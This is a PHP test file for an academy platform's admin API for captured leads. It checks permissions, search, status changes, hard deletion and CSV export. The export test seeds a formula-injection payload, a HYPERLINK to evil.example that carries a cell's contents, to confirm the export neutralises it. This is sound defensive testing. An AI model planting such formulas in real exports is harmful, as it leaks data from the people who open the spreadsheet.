<?php

declare(strict_types=1);

use App\Domain\Content\Enums\LeadStatus;
use App\Domain\Content\Models\Lead;
use App\Domain\Identity\Enums\RoleKey;
use App\Domain\Identity\Models\User;
use App\Domain\Platform\Enums\SubscriptionStatus;
use App\Domain\Platform\Models\Subscription;

/*
 * An academy's captured leads (`lead.view`, `lead.manage`, `lead.export` —
 * Admin and Super Admin). A lead asked to hear from the ACADEMY, so an
 * instructor whose course page it came from does not thereby hold it.
 */

beforeEach(function (): void {
    seedRegistry();

    $this->admin = userWithRole(RoleKey::Admin);
});

it('lists leads by latest activity and says what the reader may do with them', function (): void {
    Lead::factory()->create(['email' => 'old@example.test', 'last_submitted_at' => now()->subDays(3)]);
    Lead::factory()->create(['email' => 'new@example.test', 'last_submitted_at' => now()->subHour()]);

    $this->actingAs($this->admin)->getJson('/api/v1/admin/leads')
        ->assertOk()
        ->assertJsonPath('data.0.email', 'new@example.test')
        ->assertJsonPath('data.1.email', 'old@example.test')
        ->assertJsonPath('meta.total', 2)
        ->assertJsonPath('meta.can_manage', true)
        ->assertJsonPath('meta.can_export', true);
});

it('filters by status and searches by address or name, taking wildcards literally', function (): void {
    Lead::factory()->status(LeadStatus::Archived)->create(['email' => 'gone@example.test']);
    Lead::factory()->create(['email' => 'ada@example.test', 'name' => 'Ada Lovelace']);

    $this->actingAs($this->admin)->getJson('/api/v1/admin/leads?status=archived')
        ->assertOk()
        ->assertJsonCount(1, 'data')
        ->assertJsonPath('data.0.email', 'gone@example.test');

    $this->actingAs($this->admin)->getJson('/api/v1/admin/leads?q=lovelace')
        ->assertOk()
        ->assertJsonCount(1, 'data')
        ->assertJsonPath('data.0.email', 'ada@example.test');

    $this->actingAs($this->admin)->getJson('/api/v1/admin/leads?q=%25')
        ->assertOk()
        ->assertJsonCount(0, 'data');
});

it('refuses somebody without lead permissions, on every endpoint', function (): void {
    $instructor = User::factory()->instructor()->create();
    $lead = Lead::factory()->create();

    $this->actingAs($instructor)->getJson('/api/v1/admin/leads')->assertForbidden();
    $this->actingAs($instructor)->getJson('/api/v1/admin/leads/export')->assertForbidden();
    $this->actingAs($instructor)
        ->patchJson("/api/v1/admin/leads/{$lead->uuid}", ['status' => 'contacted'])
        ->assertForbidden();
    $this->actingAs($instructor)->deleteJson("/api/v1/admin/leads/{$lead->uuid}")->assertForbidden();

    expect($lead->fresh()?->status)->toBe(LeadStatus::New);
});

it('marks a lead contacted', function (): void {
    $lead = Lead::factory()->create();

    $this->actingAs($this->admin)
        ->patchJson("/api/v1/admin/leads/{$lead->uuid}", ['status' => 'contacted'])
        ->assertOk()
        ->assertJsonPath('data.status', 'contacted')
        ->assertJsonPath('data.status_label', 'Contacted');

    expect($lead->fresh()?->status)->toBe(LeadStatus::Contacted);
});

it('refuses a status that does not exist', function (): void {
    $lead = Lead::factory()->create();

    $response = $this->actingAs($this->admin)
        ->patchJson("/api/v1/admin/leads/{$lead->uuid}", ['status' => 'converted'])
        ->assertUnprocessable();

    expect($response)->toBeApiError('validation_failed');
});

it('erases a lead outright rather than hiding it', function (): void {
    $lead = Lead::factory()->create();

    $this->actingAs($this->admin)->deleteJson("/api/v1/admin/leads/{$lead->uuid}")->assertNoContent();

    // A soft-deleted row would be a copy of the data somebody asked us to be rid of.
    expect(Lead::query()->whereKey($lead->id)->exists())->toBeFalse();
});

it('lets a lapsed academy still read and erase leads, while it cannot relabel one', function (): void {
    Subscription::where('tenant_id', tenancy()->tenant->getTenantKey())->firstOrFail()
        ->forceFill(['status' => SubscriptionStatus::Expired, 'current_period_ends_at' => now()->subMonth()])
        ->save();

    $lead = Lead::factory()->create();

    // Bookkeeping is a write like any other.
    expect($this->actingAs($this->admin)
        ->patchJson("/api/v1/admin/leads/{$lead->uuid}", ['status' => 'contacted'])
        ->assertStatus(402))->toBeApiError('subscription_lapsed');

    $this->actingAs($this->admin)->getJson('/api/v1/admin/leads')->assertOk();

    // "Delete my details" has to be honoured whether or not the academy has paid us.
    $this->actingAs($this->admin)->deleteJson("/api/v1/admin/leads/{$lead->uuid}")->assertNoContent();
});

it('exports the list as a file a spreadsheet cannot be tricked into running', function (): void {
    Lead::factory()->create([
        'email' => 'ada@example.test',
        'name' => '=HYPERLINK("https://evil.example/?"&A2,"Open")',
    ]);

    $response = $this->actingAs($this->admin)->get('/api/v1/admin/leads/export')->assertOk();

    expect($response->headers->get('Content-Type'))->toContain('text/csv');

    $csv = $response->streamedContent();

    // A stranger typed that name. Opened as-is, it runs in the admin's spreadsheet.
    expect($csv)->toContain('email,name,status')
        ->toContain('ada@example.test')
        ->toContain('"\'=HYPERLINK(')
        ->not->toContain(',=HYPERLINK(')
        ->not->toContain(',"=HYPERLINK(');
});
